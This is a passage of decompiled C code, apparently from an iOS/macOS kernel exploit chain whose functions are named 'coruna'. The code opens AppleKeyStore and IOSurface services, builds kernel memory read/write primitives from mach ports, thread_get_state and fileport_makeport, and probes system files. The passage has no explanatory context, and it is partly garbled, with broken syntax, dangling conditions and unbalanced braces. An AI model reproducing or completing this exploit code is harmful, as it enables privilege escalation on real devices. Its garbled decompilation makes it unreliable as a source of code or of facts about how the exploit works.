  ptr = (pthread_mutexattr_t *)(handle + 0x110);
  err = _pthread_mutexattr_init(ptr);
  u = 0xad009;
  if ((err == 0) && (err = _pthread_mutexattr_settype(ptr,1), err == 0)) {
    err = _pthread_mutex_init((pthread_mutex_t *)(handle + 0xd0),ptr);
    u = 0;
    if (err != 0) {
      u = 0xad009;
    }
  }
  return u;
}





uint64_t coruna_pthread_mutex_lock(long handle)
{
  int err;
  
  if (*(char *)(handle + 0x121) != '\0') {
    err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
    if (err == 0) {
      *(uint8_t *)(handle + 0x120) = 1;
    }
    coruna_pthread_mutexattr_destroy(handle,1);
  }
  return 0;
}





uint64_t * coruna_pthread_mutexattr_destroy(uint64_t *val,int flags)
{
  uint u;
  vm_address_t address;
  uint64_t *ptr;
  
  address = val[0x11];
  ptr = val;
  if ((address != 0) && (val[0x12] != 0)) {
    u = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,val[0x12]);
    ptr = (uint64_t *)(unsigned long)u;
  }
  val[0x11] = 0;
  val[0x12] = 0;
  if (flags == 0) {
    val[0x15] = 0;
    val[0x16] = 0;
  }
  else {
    if (1 < *(mach_port_name_t *)(val + 0x13) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(val + 0x13)
                );
      *(uint32_t *)(val + 0x13) = 0;
    }
    if (1 < *(mach_port_name_t *)((long)val + 0x9c) + 1) {
      _mach_port_deallocate
                (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                 *(mach_port_name_t *)((long)val + 0x9c));
      *(uint32_t *)((long)val + 0x9c) = 0;
    }
    if (val[0xe] != 0) {
      _CFRelease();
      val[0xe] = 0;
    }
    val[0x10] = 0;
    if (val[6] != 0) {
      _dlclose();
      val[6] = 0;
    }
    if (1 < *(semaphore_t *)((long)val + 0xcc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)val + 0xcc));
      *(uint32_t *)((long)val + 0xcc) = 0;
    }
    *(uint8_t *)(val + 0x24) = 0;
    _pthread_mutex_unlock((pthread_mutex_t *)(val + 0x1a));
    _pthread_mutex_destroy((pthread_mutex_t *)(val + 0x1a));
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    u = _pthread_mutexattr_destroy((pthread_mutexattr_t *)(val + 0x22));
    ptr = (uint64_t *)(unsigned long)u;
    val[0x22] = 0;
    val[0x23] = 0;
    val[0x24] = 0;
    val[0x15] = 0;
    val[0x14] = 0;
    val[0x17] = 0;
    val[0x16] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[0xb] = 0;
    val[10] = 0;
    val[0xd] = 0;
    val[0xc] = 0;
    val[0xf] = 0;
    val[0xe] = 0;
    val[0x11] = 0;
    val[0x10] = 0;
    val[0x13] = 0;
    val[0x12] = 0;
    val[0x19] = 0;
    val[0x18] = 0;
    val[0x1b] = 0;
    val[0x1a] = 0;
    val[0x1d] = 0;
    val[0x1c] = 0;
    val[0x1f] = 0;
    val[0x1e] = 0;
    val[0x21] = 0;
    val[0x20] = 0;
    val[0x23] = 0;
    val[0x22] = 0;
  }
  return ptr;
}





void coruna_bzero_2(long handle,unsigned long arg)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  long handle;
  unsigned long scratch [2048];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  version = *(unsigned long *)(handle + 0x520);
  _bzero(scratch,0x4000);
  handle = 0;
  do {
    if ((handle != 0) || (u = *(unsigned long *)(handle + 0x528), u == 0)) {
      u = *(unsigned long *)((long)&k_kernel_rodata_word_42f58 + handle);
    }
    size = *(unsigned long *)((long)&k_kernel_rodata_word_42f50 + handle);
    coruna_vm_copy_88e0(handle,version,scratch,0x4000);
    version = scratch[(u & arg) >> (size & 0x3f) & 0xffffffff];
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f60 + handle) & (version ^ 0xffffffffffffffff)) != 0) break;
    if ((*(unsigned long *)((long)&k_kernel_rodata_word_42f68 + handle) & version) == *(unsigned long *)((long)&k_kernel_rodata_word_42f70 + handle)
       ) {
      version = version & (*(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) ^ 0xffffffffffffffff) &
              0xfffffffff000 | *(unsigned long *)((long)&k_kernel_rodata_word_42f48 + handle) & arg;
      if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
      return;
      }
      ___stack_chk_fail(version);
    }
    version = version & 0xffffffffc000;
    handle = handle + 0x38;
  } while (handle != 0xa8);
  version = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(version);
}





uint64_t coruna_kernel600c_via_ioservicegetmatchingservice(long handle,unsigned long arg,unsigned long arg,void *ctx)
{
  long handle;
  void *ptr;
  uint8_t *ptr;
  uint8_t *buf;
  int err;
  size_t ls6;
  long addr;
  unsigned long u;
  uint64_t size;
  
  buf = k_kernel_vm_page_size_slot;
  ptr = k_kernel_vm_page_mask_slot;
  u = *(unsigned long *)k_kernel_vm_page_mask_slot;
  addr = *(long *)k_kernel_vm_page_size_slot;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (err == 0) {
    *(uint8_t *)(handle + 0x120) = 1;
    if (arg != 0) {
      handle = arg + (u & arg);
      do {
        u = *(unsigned long *)ptr & arg;
        ls6 = ((handle + addr) - 1U & -addr) - u;
        if (arg <= ls6) {
          ls6 = arg;
        }
        size = coruna_ioservicegetmatchingservice(handle,arg & (*(unsigned long *)ptr ^ 0xffffffffffffffff),
                             (*(long *)buf + u + ls6) - 1 & -*(long *)buf,0);
        *(uint8_t *)(handle + 0x120) = 0;
        _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
        return size;
      } while (arg != 0);
    }
    size = 0;
  }
  else {
    size = 0xad020;
  }
fail:
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return size;
}





void coruna_ioservicegetmatchingservice(long *handle,uint32_t *size)
{
  uint32_t u;
  uint64_t size;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  
  u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
  size = _IOServiceMatching("AppleKeyStore");
  size = _IOServiceGetMatchingService(u,size);
  _IOServiceOpen(size,*(uint32_t *)k_kernel_mach_task_self_slot,0,size);
  handle = coruna_ret_stub_3(*handle,*size);
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle + 0x48);
  *(uint64_t *)(size + 6) = size;
  size = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*handle,handle);
  *(uint64_t *)(size + 8) = size;
  coruna_kernel600c_via_fn_ptr_cast_10_10(*(uint64_t *)(*handle + 0x20),size);
  bootargs = k_kernel_rodata_word_00043428;
  scratch = k_kernel_rodata_word_43420;
  coruna_kernel600c_via_helper_5d2c_419fc_2(*(uint64_t *)(*(long *)handle[1] + 8),(long *)handle[1],k_kernel_rodata_word_480a0,2,&scratch
              );
}





void coruna_ret_stub(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_kernel600c_via_ioservicegetmatchingservice_2(val,id_2,0,size_3,off_4);
  return;
}





uint64_t
void coruna_kernel600c_via_ioservicegetmatchingservice_2(long handle,unsigned long arg,uint64_t val,uint32_t *size,uint8_t *buf)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (err == 0) {
    *(uint8_t *)(handle + 0x120) = 1;
    if (((arg & 3) == 0) && (u = coruna_ioservicegetmatchingservice(handle,arg,4,val), (int)u == 0))
    {
      *size = *(uint32_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8));
      u = 0;
      if (buf != (uint8_t *)0x0) {
        *buf = 0;
      }
    }
  }
  else {
    u = 0xad020;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return u;
}





uint64_t coruna_kernel600c_via_ioservicegetmatchingservice_3(long handle,unsigned long arg,uint32_t size)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (err == 0) {
    *(uint8_t *)(handle + 0x120) = 1;
    if (((arg & 3) == 0) && (u = coruna_ioservicegetmatchingservice(handle,arg,4,0), (int)u == 0)) {
      *(uint32_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8)) = size;
    }
  }
  else {
    u = 0xad020;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return u;
}





uint64_t coruna_kernel600c_via_ioservicegetmatchingservice_4(long handle,unsigned long arg,uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (err == 0) {
    *(uint8_t *)(handle + 0x120) = 1;
    if (((arg & 7) == 0) && (u = coruna_ioservicegetmatchingservice(handle,arg,8,val), (int)u == 0))
    {
      *id_2 = *(uint64_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8));
    }
  }
  else {
    u = 0xad020;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return u;
}





uint64_t coruna_kernel600c_via_ioservicegetmatchingservice_5(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0xd0));
  if (err == 0) {
    *(uint8_t *)(handle + 0x120) = 1;
    if (((arg & 7) == 0) && (u = coruna_ioservicegetmatchingservice(handle,arg,8,0), (int)u == 0)) {
      *(uint64_t *)((*(long *)(handle + 0x88) + arg) - *(long *)(handle + 0xa8)) = val;
    }
  }
  else {
    u = 0xad020;
  }
  *(uint8_t *)(handle + 0x120) = 0;
  _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0xd0));
  return u;
}





void coruna_dlopen_iosurface(uint *size,int *flags)
{
  unsigned long *ptr;
  unsigned long *buf;
  vm_address_t *address;
  vm_prot_t permission;
  byte err;
  uint8_t *str;
  uint8_t *copy;
  mach_port_t lm6;
  mach_msg_size_t lm7;
  mach_msg_id_t lm8;
  mach_msg_size_t lm9;
  mach_msg_id_t lm10;
  bool status;
  kern_return_t lk12;
  mach_port_name_t lm13;
  int err;
  pid_t lp15;
  mach_msg_return_t lm16;
  mach_port_t lm17;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  unsigned long tag;
  void *ptr;
  char *ptr;
  uint64_t kind;
  long handle;
  long addr;
  unsigned long type_id;
  long off;
  long *buf;
  long base;
  uint64_t type_id_8;
  uint64_t type_id_9;
  int *err;
  uint *data;
  char *buf;
  uint type_id_10;
  uint32_t *obj;
  uint *block;
  unsigned long type_id_11;
  bool flags;
  vm_address_t lv43;
  unsigned long type_id_12;
  uint32_t *entry;
  long ctx_val;
  vm_size_t lv47;
  long *str;
  unsigned long type_id_13;
  uint32_t type_id_14;
  long serial;
  uint64_t *entry_9;
  long serial_7;
  long *copy;
  uint64_t type_id_15;
  unsigned long type_id_16;
  uint16_t type_id_17;
  vm_inherit_t in_stack_ffffffffffffeeb0;
  int scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  unsigned long host_info;
  uint64_t serial_buf;
  unsigned long action;
  unsigned long block_ctx;
  long stack_guard;
  unsigned long *sa_saved;
  long sa_new;
  int *path_buf;
  int *tmp_buf;
  vm_size_t region;
  mem_entry_name_port_t plist [3];
  vm_address_t url_buf;
  char *json_buf [4];
  unsigned long frame;
  vm_address_t work;
  unsigned long cache;
  uint32_t cache_20;
  unsigned long cache_21;
  unsigned long cache_22;
  char *cache_23;
  long cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  mach_msg_header_t cache_27;
  uint host_info;
  uint32_t serial_buf;
  uint32_t action;
  uint32_t block_ctx;
  unsigned long stack_guard;
  unsigned long cache_28;
  uint64_t sa_saved;
  uint64_t cache_29;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t cache_31;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t cache_32;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t cache_33;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  uint64_t cache_34;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t cache_27;
  long cache_35;
  
  copy = k_kernel_vm_page_size_slot;
  cache_35 = *(long *)k_kernel_stack_chk_guard_slot;
  url_buf = 0;
  plist[0] = 0;
  region = *(vm_size_t *)k_kernel_vm_page_size_slot;
  tag = coruna_call_return_zero_61a8_20f50();
  *(unsigned long *)(flags + 2) = tag;
  *(uint64_t *)(flags + 0xd3a) = k_kernel_rodata_word_42fe8;
  str = k_kernel_mach_task_self_slot;
  if ((0x400000000 < tag) ||
     (lk12 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&url_buf,0x2000,1),
     if (*(long *)k_kernel_stack_chk_guard_slot != cache_35) {
     ___stack_chk_fail();
     }
     return;
}





uint64_t coruna_kernel600c_via_ctx_test_flag(long handle)
{
  int err;
  uint64_t u;
  
  if (*(char *)(handle + 0x78) == '\0') {
    if (*(int *)(*(long *)(handle + 0xa0) + 0x140) < 0x2258) {
      err = coruna_ctx_test_flag(*(long *)(handle + 0xa0),0x2000);
      u = 0x40000;
      if (err != 0) {
        u = 0x20000;
      }
    }
    else {
      u = 0xc000;
    }
  }
  else {
    u = 0xc00000;
  }
  return u;
}





void coruna_memcpy(void *ctx,void *scratch,size_t len)
{
  if ((((uint)scratch | (uint)len) & 0xf) == 0) {
    _memcpy(ctx,scratch,len);
    return;
  }
  coruna_memcpy_unaligned();
  return;
}





void coruna_memcpy_unaligned(uint64_t *val,uint64_t *id_2,unsigned long arg)
{
  unsigned long u;
  uint64_t *ptr;
  uint64_t *buf;
  unsigned long size;
  
  if (((unsigned long)val & 7) != 0) {
    size = 8 - ((unsigned long)val & 7);
    u = arg;
    if (size <= arg) {
      u = size;
    }
    arg = arg - u;
    for (; u != 0; u = u - 1) {
      *(uint8_t *)val = *(uint8_t *)id_2;
      val = (uint64_t *)((long)val + 1);
      id_2 = (uint64_t *)((long)id_2 + 1);
    }
  }
  u = arg;
  if ((((unsigned long)id_2 & 7) == 0) && (u = arg & 7, 7 < arg)) {
    size = arg >> 3;
    ptr = val;
    buf = id_2;
    do {
      id_2 = buf + 1;
      val = ptr + 1;
      *ptr = *buf;
      size = size - 1;
      ptr = val;
      buf = id_2;
    } while (size != 0);
  }
  for (; u != 0; u = u - 1) {
    *(uint8_t *)val = *(uint8_t *)id_2;
    val = (uint64_t *)((long)val + 1);
    id_2 = (uint64_t *)((long)id_2 + 1);
  }
  return;
}





uint64_t coruna_shmem_rw_locked(long handle,long addr_2,unsigned long arg,long off_3)
{
  int err;
  uint64_t u;
  unsigned long size;
  long scratch;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)(handle + 0x638));
  if (err == 0) {
    scratch = 0;
    if (arg == 0) {
      u = 0;
    }
    else {
      size = 0;
      do {
        u = coruna_thread_get_state(handle,size + addr_2,size + off_3,arg - size,&scratch);
        if ((int)u != 0) break;
        size = scratch + size;
      } while (size < arg);
    }
    _pthread_mutex_unlock((pthread_mutex_t *)(handle + 0x638));
  }
  else {
    u = 0xad020;
  }
  return u;
}





unsigned long coruna_thread_get_state(long arg,unsigned long val,void *n,size_t m,size_t *p)

{
  long handle;
  long base;
  uint u;
  bool flags;
  kern_return_t lk5;
  uint type_id_13;
  unsigned long port;
  unsigned long type_id_14;
  uint type_id_15;
  unsigned long type_id_16;
  uint64_t cache_29;
  natural_t cache_30 [135];
  mach_msg_type_number_t cache_31;
  
  cache_31 = 0x84;
  type_id_16 = *(unsigned long *)k_kernel_vm_page_mask_slot;
  type_id_14 = type_id_16 & val;
  if (*(long *)k_kernel_vm_page_size_slot - 0x210U <= type_id_14) {
    type_id_14 = *(long *)k_kernel_vm_page_size_slot - 0x210U;
  }
  cache_29 = 0;
  handle = arg + 0xf0;
  port = coruna_kernel600c_via_ioservicegetmatchingservice_4(handle,*(uint64_t *)(arg + 0x2a0),0,&cache_29);
  if ((int)port == 0) {
    base = type_id_14 + (val & (type_id_16 ^ 0xffffffffffffffff));
    port = coruna_kernel600c_via_ioservicegetmatchingservice_5(handle,*(uint64_t *)(arg + 0x2a0),base + -0x10);
    if ((int)port == 0) {
      lk5 = _thread_get_state(*(thread_act_t *)(arg + 0x300),0x11,cache_30,&cache_31);
      flags = cache_31 != 0x84;
      if (lk5 != 0 || flags) {
        type_id_15 = 0xad022;
      }
      else {
        type_id_14 = (base - val) + 0x210;
        if (type_id_14 <= m) {
          m = type_id_14;
        }
        *p = m;
        _memcpy(n,(void *)((long)cache_30 + (val - base)),m);
        type_id_15 = 0;
      }
      type_id_13 = coruna_kernel600c_via_ioservicegetmatchingservice_5(handle,*(uint64_t *)(arg + 0x2a0),cache_29);
      u = type_id_13;
      if (lk5 != 0 || flags) {
        u = type_id_15;
      }
      if (type_id_13 != 0) {
        type_id_15 = u;
      }
      port = (unsigned long)type_id_15;
    }
  }
  return port;
}
void coruna_open_iosurface_root(long handle)
{
  uint64_t *ptr;
  uint32_t u;
  unsigned long size;
  uint version;
  int err;
  int status;
  uint port;
  uint32_t *buf;
  uint8_t *str;
  uint8_t *copy;
  long handle;
  uint64_t tag;
  long addr;
  long off;
  unsigned long kind;
  long base;
  int *err;
  long ctx_val;
  long serial;
  uint *data;
  unsigned long type_id;
  unsigned long type_id_8;
  vm_size_t size;
  long *ptr;
  uint32_t *obj;
  int flags;
  uint scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint serial_buf [2];
  uint32_t *action;
  char block_ctx;
  mem_entry_name_port_t stack_guard;
  vm_size_t sa_saved;
  long sa_new;
  unsigned long path_buf;
  uint tmp_buf;
  int region;
  uint plist;
  unsigned long url_buf;
  unsigned long json_buf;
  unsigned long frame;
  long work;
  uint64_t cache;
  uint64_t cache_20;
  long cache_21;
  unsigned long cache_22 [3];
  uint32_t bootargs;
  uint32_t cache_23;
  uint32_t thread_attr;
  uint64_t host_info;
  uint32_t cache_24;
  unsigned long cache_25;
  long cache_26;
  
  cache_26 = *(long *)k_kernel_stack_chk_guard_slot;
  buf = _calloc(1,0x710);
  if (buf != (uint32_t *)0x0) {
    flags = 0;
    obj = buf + 4;
    *buf = 8;
    ptr = (long *)(buf + 2);
    *ptr = handle;
    ptr = (uint64_t *)(buf + 0xa2);
    u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
    serial = handle;
    do {
      str = (uint8_t *)coruna_dlopen_iosurface(buf + 0x3c,serial);
      copy = str;
      if ((int)str == 0) {
        scratch = *(uint64_t *)(buf + 0x6c);
        host_info = *(uint64_t *)(buf + 0x6a);
        str = (uint8_t *)
                 coruna_kernel600c_via_call_return_zero_61a8_165ac(coruna_bzero_2,coruna_ret_stub,buf + 0x3c,obj,*ptr,&host_info);
        copy = str;
        if (((int)str != 0) ||
           (str = (uint8_t *)coruna_kernel600c_via_pacia_12(buf), copy = str, (int)str != 0))
        {
          serial = *ptr;
          *(uint64_t *)(serial + 0x30) = 0;
          *(uint64_t *)(serial + 0x50) = 0;
          status = (int)copy;
          {
          {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
          }
          break;
          }
          flags = flags + 1;
        }
        *(unsigned long *)(buf + 0xac) = *(long *)(buf + 0x28) + (unsigned long)(uint)buf[0x91];
        str = (uint8_t *)coruna_pthread_mutex_init(buf);
        copy = str;
        if (((int)str != 0) ||
           ((str = (uint8_t *)coruna_getpid(buf), copy = str, (int)str != 0 ||
            (str = (uint8_t *)coruna_kernel600c_via_vm_deallocate(buf), copy = str, (int)str != 0))))
        {
          serial = *ptr;
          *(uint64_t *)(serial + 0x30) = 0;
          *(uint64_t *)(serial + 0x50) = 0;
          status = (int)copy;
          {
          {
          if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
          return;
          }
          ___stack_chk_fail(str);
          }
          break;
          }
          flags = flags + 1;
        }
        data = (uint *)*ptr;
        type_id = *(unsigned long *)(data + 0x56);
        if (type_id < 0x1f530f02800000) {
          if ((0x1c1b0a800fffff < type_id) &&
             (((*data & 0x5584001) != 0 || (0x1f52ffffffffff < type_id)))) goto done;
          cache = 0xffffffffffffffff;
          cache_20 = 0xffffffffffffffff;
          copy = (uint8_t *)coruna_kernel600c_via_pacia_12(buf);
          if (((int)copy == 0) &&
             (((copy = (uint8_t *)coruna_kernel600c_residual_235(&cache_20), (int)copy == 0 &&
               (copy = (uint8_t *)coruna_kernel600c_via_fcntl(&cache_20), (int)copy == 0)) &&
              (copy = (uint8_t *)coruna_kernel600c_residual_235(&cache), (int)copy == 0)))) {
            coruna_vm_deallocate(obj);
            copy = (uint8_t *)
                      coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache_20 & 0xffffffff,
                                   cache_22);
            if ((((int)copy == 0) &&
                (copy = (uint8_t *)
                           coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache & 0xffffffff,
                                        &cache_21), (int)copy == 0)) &&
               (copy = (uint8_t *)
                          coruna_kernel600c_via_helper_6094_7600(buf,cache_22[0] + (uint)buf[0x9c],cache_21),
               (int)copy == 0)) {
              serial = *ptr;
              *(int *)(&k_kernel_slot_1930 + serial) = (int)cache_20;
              *(int *)(&k_kernel_slot_1934 + serial) = cache_20;
              *(int *)(&k_kernel_slot_1938 + serial) = (int)cache;
              *(uint *)(&k_kernel_slot_193c + serial) = cache;
              copy = &UNK_0003f004;
              if ((((int)cache_20 != -1) && (cache_20 != -1)) &&
                 ((copy = &UNK_0003f004, (int)cache != -1 && (cache != -1)))) {
                serial = *(long *)(buf + 0xa0);
                if (serial == 0) {
                  copy = (uint8_t *)coruna_kernel600c_residual_218(buf);
                  {
                    if ((int)cache_20 != -1) {
                    _close((int)cache_20);
                    }
                    if (cache_20 != -1) {
                    _close(cache_20);
                    }
                    if ((int)cache != -1) {
                    _close((int)cache);
                    }
                    version = cache;
                    if (cache != 0xffffffff) {
                    version = _close(cache);
                    }
                    str = (uint8_t *)(unsigned long)version;
                    serial = *ptr;
                    *(uint64_t *)(&k_kernel_slot_1938 + serial) = 0xffffffffffffffff;
                    *(uint64_t *)(&k_kernel_slot_1930 + serial) = 0xffffffffffffffff;
                    serial = *ptr;
                    *(uint64_t *)(serial + 0x30) = 0;
                    *(uint64_t *)(serial + 0x50) = 0;
                    status = (int)copy;
                    {
                    {
                    if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                    return;
                    }
                    ___stack_chk_fail(str);
                    }
                    break;
                    }
                    flags = flags + 1;
                  }
                  serial = *(long *)(buf + 0xa0);
                }
                status = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,serial + (unsigned long)(uint)buf[0x95],ptr,0);
                copy = &k_kernel_rodata_word_3f002;
                if (status == 0) {
                  serial = *ptr;
                  *(uint64_t *)(&k_kernel_slot_19d0 + serial) = *ptr;
                  copy = (uint8_t *)
                            coruna_kernel600c_via_fileport_makeport(serial,*(uint32_t *)(&k_kernel_slot_1930 + serial));
                  if (((((int)copy == 0) &&
                       (copy = (uint8_t *)
                                  coruna_kernel600c_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_1934 + *ptr)),
                       (int)copy == 0)) &&
                      (copy = (uint8_t *)
                                 coruna_kernel600c_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_1938 + *ptr)),
                      (int)copy == 0)) &&
                     (str = (uint8_t *)
                               coruna_kernel600c_via_fileport_makeport(*ptr,*(uint32_t *)(&k_kernel_slot_193c + *ptr)),
                     {
                       serial = *ptr;
                       *(uint64_t *)(serial + 0x30) = 0;
                       *(uint64_t *)(serial + 0x50) = 0;
                       status = (int)copy;
                       {
                       {
                       if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
                       return;
                       }
                       ___stack_chk_fail(str);
                       }
                       break;
                       }
                       flags = flags + 1;
                     }
                }
              }
            }
          }
cleanup:
          if ((int)cache_20 != -1) {
            _close((int)cache_20);
          }
          if (cache_20 != -1) {
            _close(cache_20);
          }
          if ((int)cache != -1) {
            _close((int)cache);
          }
          version = cache;
          if (cache != 0xffffffff) {
            version = _close(cache);
          }
          str = (uint8_t *)(unsigned long)version;
          serial = *ptr;
          *(uint64_t *)(&k_kernel_slot_1938 + serial) = 0xffffffffffffffff;
          *(uint64_t *)(&k_kernel_slot_1930 + serial) = 0xffffffffffffffff;
          {
            serial = *ptr;
            *(uint64_t *)(serial + 0x30) = 0;
            *(uint64_t *)(serial + 0x50) = 0;
            status = (int)copy;
            {
            {
            if (*(long *)k_kernel_stack_chk_guard_slot == cache_26) {
            return;
            }
            ___stack_chk_fail(str);
            }
            break;
            }
            flags = flags + 1;
          }
        }
        if (((*data & 0x5584001) == 0) && (type_id < 0x1f541900000000)) {
done:
          cache = 0xffffffffffffffff;
          path_buf = path_buf & 0xffffffff00000000;
          copy = (uint8_t *)coruna_kernel600c_residual_235(&cache);
          if (((int)copy == 0) &&
             (copy = (uint8_t *)coruna_kernel600c_via_fcntl(&cache), (int)copy == 0)) {
            coruna_kernel600c_residual_237(&cache,&path_buf,4);
            coruna_kernel600c_residual_238(&cache,&path_buf,4);
            status = _socket(2,2,0);
            if (status == -1) {
              copy = &UNK_0003f003;
            }
            else {
              copy = (uint8_t *)
                        coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,*(uint64_t *)(buf + 0x86),cache & 0xffffffff,
                                     &work);
              if ((int)copy == 0) {
                coruna_vm_deallocate(obj);
                copy = (uint8_t *)
                          coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,work + (unsigned long)(uint)buf[0x9c],&frame,0);
                if ((((int)copy == 0) &&
                    (copy = (uint8_t *)
                               coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_2(buf,*(uint64_t *)(buf + 0x86),status,&json_buf),
                    type_id = json_buf, (int)copy == 0)) &&
                   (copy = (uint8_t *)
                              coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,json_buf + (uint)buf[0x9a],&url_buf,0),
                   (int)copy == 0)) {
                  serial = *(long *)(buf + 2);
                  *(void (**)(serial + 0x30) = coruna_kernel600c_residual_217;
                  *(uint32_t **)(serial + 0x50) = buf;
                  copy = (uint8_t *)coruna_kernel600c_residual_253(serial,&cache,url_buf);
                  if ((int)copy == 0) {
                    serial = *(long *)(buf + 2);
                    *(uint64_t *)(serial + 0x30) = 0;
                    *(uint64_t *)(serial + 0x50) = 0;
                    str = (uint8_t *)coruna_kernel600c_via_helper_6094_7600(buf,type_id + (uint)buf[0x9a],frame);
                    copy = str;
                    if ((int)str == 0) {
                      serial = *ptr;
                      *(int *)(&k_kernel_slot_1930 + serial) = (int)cache;
                      *(uint *)(&k_kernel_slot_1934 + serial) = cache;
                      *(int *)(&k_kernel_slot_1940 + serial) = status;
                      *(unsigned long *)(serial + 0x218) = frame;
                      if (((int)cache == -1) || (cache == -1)) {
                        copy = (uint8_t *)0x28001;
                      }
                      else {
                        copy = (uint8_t *)0x28001;
                        if (frame != 0) {
                          cache_21 = 0;
                          cache_22[0] = 0;
                          status = _open("/private/etc/group",0);
                          if (status == -1) {
                            err = ___error();
                            status = *err;
                            data = (uint *)___error();
                            version = -*data;
                            if (-1 < status) {
                              version = *data;
                            }
                            copy = (uint8_t *)(unsigned long)(version | 0x40000000);
                          }
                          else {
                            copy = (uint8_t *)
                                      coruna_kernel600c_via_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_2(buf,*(uint64_t *)(buf + 0x86),status,
                                                   &cache_21);
                            if (((int)copy == 0) &&
                               (copy = (uint8_t *)
                                          coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,cache_21 + (unsigned long)(uint)buf[0x98],
                                                       cache_22,0), (int)copy == 0)) {
                              serial = -0x20000;
                              if (*(int *)(*ptr + 0x140) < 0x1f54) {
                                serial = 0x80;
                              }
                              thread_attr = serial + cache_22[0];
                              type_id = cache_22[0];
                              if (*(int *)(*ptr + 0x140) < 0x1f54) {
                                type_id = cache_22[0] + 0x400;
                              }
                              copy = (uint8_t *)0xad011;
                              if (thread_attr < type_id) {
                                bootargs = 0;
                                err = 0;
                                do {
                                  copy = (uint8_t *)coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(buf,thread_attr,&cache_20,1);
                                  if ((int)copy != 0) break;
                                  if (bootargs == 0) {
                                    bootargs = thread_attr;
                                    if (cache_20 != 7) {
                                      bootargs = 0;
                                    }
